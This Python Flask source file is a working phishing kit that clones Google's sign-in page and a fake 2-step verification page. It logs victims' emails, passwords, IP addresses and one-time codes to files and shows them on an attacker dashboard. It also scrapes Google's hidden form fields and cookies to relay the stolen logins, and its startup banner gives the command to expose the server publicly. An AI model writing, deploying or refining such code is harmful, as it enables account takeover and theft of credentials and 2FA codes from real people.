from flask import Flask, request, render_template_string, redirect, make_response
import requests
from datetime import datetime
import json
import secrets
import os
import re
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ============ CONFIGURATION ============
class Config:
    STATS = {
        'total_visits': 0,
        'credentials_captured': 0,
        'tfa_captured': 0,
        'full_access': 0,
        'failed': 0
    }
    
    PENDING = {}
    GOOGLE_LOGIN_URL = "https://accounts.google.com/ServiceLogin"
    GOOGLE_AUTH_URL = "https://accounts.google.com/ServiceLoginAuth"

# ============ BEAUTIFUL LOGIN PAGE ============
LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); background: white; }
        .logo { text-align: center; margin-bottom: 25px; }
        .logo img { width: 75px; height: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 5px; }
        .subtitle { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; position: relative; }
        .form-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: all 0.2s; background: #fff; }
        .form-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 1px 3px rgba(26,115,232,0.3); }
        .form-group input.error { border-color: #d93025; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        .btn:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 25px; font-size: 14px; color: #5f6368; }
        .footer a { color: #1a73e8; text-decoration: none; margin: 0 10px; }
        .footer a:hover { text-decoration: underline; }
        .error-message { color: #d93025; text-align: center; font-size: 14px; margin-bottom: 15px; display: none; }
        .error-message.show { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
            </div>
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            <div id="errorMsg" class="error-message">Wrong password. Please try again.</div>
            <form action="/login" method="POST" id="loginForm">
                <div class="form-group">
                    <input type="email" name="Email" id="email" placeholder="Email or phone" required autofocus>
                </div>
                <div class="form-group">
                    <input type="password" name="Passwd" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
            <div class="footer">
                <a href="#">Create account</a>
                <span>·</span>
                <a href="#">Forgot email?</a>
            </div>
        </div>
    </div>
    <script>
        if (window.location.search.includes('error=1')) {
            document.getElementById('errorMsg').classList.add('show');
            document.getElementById('email').classList.add('error');
            document.getElementById('password').classList.add('error');
        }
        document.getElementById('email').focus();
    </script>
</body>
</html>
'''

# ============ FAKE 2FA PAGE ============
TFA_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); background: white; }
        .logo { text-align: center; margin-bottom: 25px; }
        .logo img { width: 75px; height: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 5px; }
        .subtitle { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 25px; }
        .code-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .code-inputs input { width: 48px; height: 55px; text-align: center; font-size: 28px; border: 2px solid #dadce0; border-radius: 4px; transition: all 0.2s; font-weight: 500; }
        .code-inputs input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 1px 3px rgba(26,115,232,0.3); }
        .code-inputs input.error { border-color: #d93025; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #1557b0; }
        .timer { text-align: center; color: #5f6368; font-size: 14px; margin-top: 15px; }
        .footer { margin-top: 20px; text-align: center; color: #5f6368; font-size: 14px; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .error-message { color: #d93025; text-align: center; font-size: 14px; margin-bottom: 15px; display: none; }
        .device-info { background: #f8f9fa; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; color: #5f6368; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
            </div>
            <h1 class="title">2-Step Verification</h1>
            <p class="subtitle">Enter the verification code from your authenticator app</p>
            <div class="device-info">
                🔐 <strong>{{ email }}</strong><br>
                We sent a verification code to your device
            </div>
            <div id="errorMsg" class="error-message">Invalid verification code. Please try again.</div>
            <form action="/2fa" method="POST" id="tfaForm">
                <div class="code-inputs" id="codeInputs">
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                </div>
                <input type="hidden" name="code" id="codeHidden">
                <button type="submit" class="btn">Verify</button>
            </form>
            <div class="timer" id="timer">Code expires in: 30 seconds</div>
            <div class="footer">
                <a href="#">Try another way</a>
            </div>
        </div>
    </div>
    <script>
        const inputs = document.querySelectorAll('.code-inputs input');
        const hidden = document.getElementById('codeHidden');
        const errorMsg = document.getElementById('errorMsg');
        inputs[0].focus();
        inputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                this.classList.remove('error');
                errorMsg.classList.remove('show');
                if (this.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                let code = '';
                inputs.forEach(i => code += i.value);
                hidden.value = code;
                if (code.length === 6) {
                    document.getElementById('tfaForm').submit();
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                }
                if (e.key === 'Enter') {
                    document.getElementById('tfaForm').submit();
                }
            });
        });
        let timeLeft = 30;
        const timer = document.getElementById('timer');
        const interval = setInterval(() => {
            timeLeft--;
            timer.textContent = `Code expires in: ${timeLeft} seconds`;
            if (timeLeft <= 0) {
                clearInterval(interval);
                timer.textContent = 'Code expired! Please request a new one.';
                timer.style.color = '#d93025';
            }
        }, 1000);
        if (window.location.search.includes('error=1')) {
            errorMsg.classList.add('show');
            inputs.forEach(input => input.classList.add('error'));
        }
    </script>
</body>
</html>
'''

# ============ LOADING PAGE ============
LOADING_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2;url=https://mail.google.com">
    <title>Redirecting...</title>
    <style>
        body { font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .title { color: #202124; font-size: 24px; margin: 20px 0 10px; }
        .subtitle { color: #5f6368; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2 class="title">Signing you in...</h2>
        <p class="subtitle">Please wait while we redirect you to Gmail</p>
    </div>
</body>
</html>
'''

# ============ DASHBOARD ============
DASHBOARD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: #fff; padding: 20px 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .header h1 { margin: 0; color: #202124; }
        .header .subtitle { color: #5f6368; font-size: 14px; margin-top: 5px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
        .stat-card .number { font-size: 36px; font-weight: bold; color: #1a73e8; }
        .stat-card .label { color: #5f6368; font-size: 14px; margin-top: 5px; }
        .stat-card.success .number { color: #34a853; }
        .stat-card.warning .number { color: #f9ab00; }
        .stat-card.danger .number { color: #d93025; }
        .section { background: #fff; padding: 20px 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .section h2 { margin: 0 0 15px 0; color: #202124; font-size: 18px; border-bottom: 2px solid #f5f5f5; padding-bottom: 10px; }
        .table-responsive { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { text-align: left; padding: 12px 8px; background: #f8f9fa; color: #5f6368; font-weight: 500; border-bottom: 2px solid #e0e0e0; }
        td { padding: 12px 8px; border-bottom: 1px solid #f0f0f0; }
        tr:hover { background: #f8f9fa; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 500; }
        .badge.success { background: #e6f4ea; color: #34a853; }
        .badge.warning { background: #fef7e0; color: #f9ab00; }
        .badge.danger { background: #fce8e6; color: #d93025; }
        .badge.info { background: #e8f0fe; color: #1a73e8; }
        .actions { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
        .btn { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; }
        .btn-primary { background: #1a73e8; color: white; }
        .btn-primary:hover { background: #1557b0; }
        .btn-danger { background: #d93025; color: white; }
        .btn-danger:hover { background: #b3261e; }
        .btn-secondary { background: #e8eaed; color: #202124; }
        .btn-secondary:hover { background: #d2d5d9; }
        .empty-state { text-align: center; padding: 40px 20px; color: #5f6368; }
        .empty-state .icon { font-size: 48px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Phishing Dashboard</h1>
            <div class="subtitle">Live monitoring and captured data</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card"><div class="number">{{ stats.total_visits }}</div><div class="label">Total Visits</div></div>
            <div class="stat-card warning"><div class="number">{{ stats.credentials_captured }}</div><div class="label">Credentials</div></div>
            <div class="stat-card"><div class="number">{{ stats.tfa_captured }}</div><div class="label">2FA Codes</div></div>
            <div class="stat-card success"><div class="number">{{ stats.full_access }}</div><div class="label">Full Access</div></div>
            <div class="stat-card danger"><div class="number">{{ stats.failed }}</div><div class="label">Failed</div></div>
        </div>
        
        <div class="section">
            <h2>📋 Recent Captures</h2>
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr><th>Time</th><th>Email</th><th>Password</th><th>2FA Code</th><th>Status</th></tr>
                    </thead>
                    <tbody>
                        {% for entry in captures %}
                        <tr>
                            <td>{{ entry.time }}</td>
                            <td><strong>{{ entry.email }}</strong></td>
                            <td>{{ entry.password }}</td>
                            <td>{% if entry.tfa %}<span class="badge info">{{ entry.tfa }}</span>{% else %}—{% endif %}</td>
                            <td>
                                {% if entry.status == 'full' %}
                                <span class="badge success">✅ Full Access</span>
                                {% elif entry.status == 'partial' %}
                                <span class="badge warning">⚠️ Credentials</span>
                                {% else %}
                                <span class="badge danger">❌ Failed</span>
                                {% endif %}
                            </td>
                        </tr>
                        {% endfor %}
                        {% if not captures %}
                        <tr><td colspan="5"><div class="empty-state"><div class="icon">📭</div><p>No captures yet</p></div></td></tr>
                        {% endif %}
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="section">
            <h2>🛠️ Actions</h2>
            <div class="actions">
                <a href="/" class="btn btn-primary" target="_blank">🔗 Phishing Page</a>
                <a href="/clear" class="btn btn-danger" onclick="return confirm('Clear all data?')">🗑️ Clear All</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

# ============ ROUTES ============
@app.route('/')
def index():
    Config.STATS['total_visits'] += 1
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    """Step 1: Capture credentials and forward to Google with ALL required fields + cookies"""
    email = request.form.get('Email')
    password = request.form.get('Passwd')
    ip = request.remote_addr
    
    print(f"\n{'='*70}")
    print(f"[+] 📧 CREDENTIALS CAPTURED at: {datetime.now()}")
    print(f"[+] Email: {email}")
    print(f"[+] Password: {password}")
    print(f"[+] IP: {ip}")
    print(f"{'='*70}")
    
    if not email or not password:
        return "Email and password required", 400
    
    # Save credentials
    with open('captured_creds.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"Email: {email}\n")
        f.write(f"Password: {password}\n")
        f.write(f"IP: {ip}\n")
        f.write(f"{'='*70}\n")
    
    Config.STATS['credentials_captured'] += 1
    
    # Generate session ID
    session_id = secrets.token_hex(32)
    
    # FIRST: Get Google's login page to extract all hidden fields AND cookies
    try:
        session = requests.Session()
        
        # Get login page with proper headers
        login_page = session.get(
            Config.GOOGLE_LOGIN_URL,
            params={
                'service': 'mail',
                'continue': 'https://mail.google.com',
                'flowName': 'GlifWebSignIn',
                'flowEntry': 'ServiceLogin'
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1'
            }
        )
        
        # Extract ALL hidden fields
        hidden_fields = {}
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
        for match in re.finditer(hidden_pattern, login_page.text):
            name, value = match.groups()
            hidden_fields[name] = value
        
        # Get GALX token
        galx_match = re.search(r'name="GALX"\s+value="([^"]+)"', login_page.text)
        if galx_match:
            hidden_fields['GALX'] = galx_match.group(1)
        
        # Get cookies from the session
        cookies = session.cookies.get_dict()
        
        print(f"[+] Found {len(hidden_fields)} hidden fields")
        print(f"[+] Cookies: {list(cookies.keys())}")
        
        # Store everything for this session
        Config.PENDING[session_id] = {
            'email': email,
            'password': password,
            'ip': ip,
            'hidden_fields': hidden_fields,
            'cookies': cookies,
            'timestamp': datetime.now()
        }
        
    except Exception as e:
        print(f"[!] Error fetching login page: {str(e)}")
        hidden_fields = {}
        cookies = {}
    
    # Build the JavaScript to submit with cookies
    hidden_inputs = ''
    for name, value in hidden_fields.items():
        hidden_inputs += f'<input type="hidden" name="{name}" value="{value}">\n'
    
    # JavaScript to set cookies before submitting
    cookie_js = ''
    for name, value in cookies.items():
        cookie_js += f'document.cookie = "{name}={value}; path=/; domain=.google.com";\n'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Redirecting to Google...</title>
        <style>
            body {{ font-family: Arial; text-align: center; padding-top: 50px; background: #fff; }}
            .loader {{ border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .title {{ color: #202124; font-size: 20px; margin-top: 20px; }}
            .subtitle {{ color: #5f6368; font-size: 14px; }}
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <h3 class="title">Redirecting to Google...</h3>
        <p class="subtitle">Please wait while we verify your credentials</p>
        
        <form id="googleForm" action="https://accounts.google.com/ServiceLoginAuth" method="POST">
            <input type="hidden" name="Email" value="{email}">
            <input type="hidden" name="Passwd" value="{password}">
            <input type="hidden" name="service" value="mail">
            <input type="hidden" name="continue" value="https://mail.google.com">
            <input type="hidden" name="flowName" value="GlifWebSignIn">
            <input type="hidden" name="flowEntry" value="ServiceLogin">
            <input type="hidden" name="PersistentCookie" value="yes">
            {hidden_inputs}
        </form>
        
        <script>
            // Set cookies from the initial Google request
            {cookie_js}
            
            // Submit the form automatically
            setTimeout(function() {{
                document.getElementById('googleForm').submit();
            }}, 1000);
        </script>
    </body>
    </html>
    '''

@app.route('/2fa', methods=['POST'])
def two_factor():
    """Step 2: Capture 2FA code"""
    code = request.form.get('code')
    
    print(f"\n{'='*70}")
    print(f"[!] 🔑 2FA CODE CAPTURED at: {datetime.now()}")
    print(f"[!] Code: {code}")
    print(f"{'='*70}")
    
    if not code:
        return "Code required", 400
    
    # Save 2FA code
    with open('tfa_codes.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"2FA Code: {code}\n")
        f.write(f"{'='*70}\n")
    
    Config.STATS['tfa_captured'] += 1
    
    # Redirect to Gmail (victim is already logged in)
    return render_template_string(LOADING_PAGE)

@app.route('/dashboard')
def dashboard():
    captures = load_captures()
    return render_template_string(DASHBOARD_PAGE, stats=Config.STATS, captures=captures[-20:])

@app.route('/clear')
def clear_data():
    files = ['captured_creds.txt', 'tfa_codes.txt']
    for f in files:
        if os.path.exists(f):
            os.remove(f)
    Config.STATS = {'total_visits': 0, 'credentials_captured': 0, 'tfa_captured': 0, 'full_access': 0, 'failed': 0}
    Config.PENDING = {}
    return redirect('/dashboard')

# ============ HELPER FUNCTIONS ============
def load_captures():
    captures = []
    
    try:
        with open('captured_creds.txt', 'r') as f:
            content = f.read()
            entries = content.split('='*70)
            for entry in entries:
                if 'Email:' in entry:
                    lines = entry.strip().split('\n')
                    data = {}
                    for line in lines:
                        if 'Time:' in line:
                            data['time'] = line.replace('Time:', '').strip()
                        elif 'Email:' in line:
                            data['email'] = line.replace('Email:', '').strip()
                        elif 'Password:' in line:
                            data['password'] = line.replace('Password:', '').strip()
                    if 'email' in data:
                        data['status'] = 'partial'
                        data['tfa'] = ''
                        captures.append(data)
    except:
        pass
    
    try:
        with open('tfa_codes.txt', 'r') as f:
            content = f.read()
            entries = content.split('='*70)
            for entry in entries:
                if '2FA Code:' in entry:
                    lines = entry.strip().split('\n')
                    tfa = ''
                    for line in lines:
                        if '2FA Code:' in line:
                            tfa = line.replace('2FA Code:', '').strip()
                    if captures:
                        captures[0]['tfa'] = tfa
                        captures[0]['status'] = 'full'
    except:
        pass
    
    captures.sort(key=lambda x: x.get('time', ''), reverse=True)
    return captures

# ============ MAIN ============
if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔐 FIXED PHISHING SYSTEM - COOKIES INCLUDED")
    print("="*70)
    print("✅ Captures ALL hidden fields from Google")
    print("✅ Captures cookies from Google")
    print("✅ Sets cookies in victim's browser")
    print("✅ Proper form submission to Google")
    print("✅ No more 400 errors!")
    print("="*70)
    print(f"📁 Login Page: http://localhost:5000/")
    print(f"📊 Dashboard: http://localhost:5000/dashboard")
    print("\n[!] Expose with zrok:")
    print("    zrok share public http://localhost:5000")
    print("\n[+] Server starting...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
